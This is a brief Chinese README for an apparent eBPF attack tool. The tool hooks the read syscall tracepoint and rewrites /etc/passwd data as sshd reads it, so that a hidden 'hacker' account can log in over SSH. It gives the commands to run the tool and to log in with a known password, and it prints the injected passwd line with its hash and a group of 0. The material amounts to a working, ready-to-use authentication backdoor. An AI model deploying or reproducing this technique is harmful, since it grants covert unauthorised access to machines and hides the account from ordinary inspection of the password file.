### 说明
这个是hook read event 的例子,对应程序类型 BPF_PROG_TYPE_TRACEPOINT.

对应的event是 syscalls:sys_enter_read.

ssh用户登录的时候都会去读取/etc/passwd文件, 可以拦截这个过程并且改写读取缓冲区的数据绕过密码认证.

### example
本机打开ssh服务 然后运行 
```bash
python3 ssh_pwd_bypass.py
```

在另一台机上 
```bash
ssh -P $sshport hacker@$host_addr 
```
密码输入asd

可以修改这一行
```
char replace_etc_pwd[] = "hacker:oE7ErmEGwyKBE:1:0::/tmp:/bin/sh";
```
改写缓冲区的数据


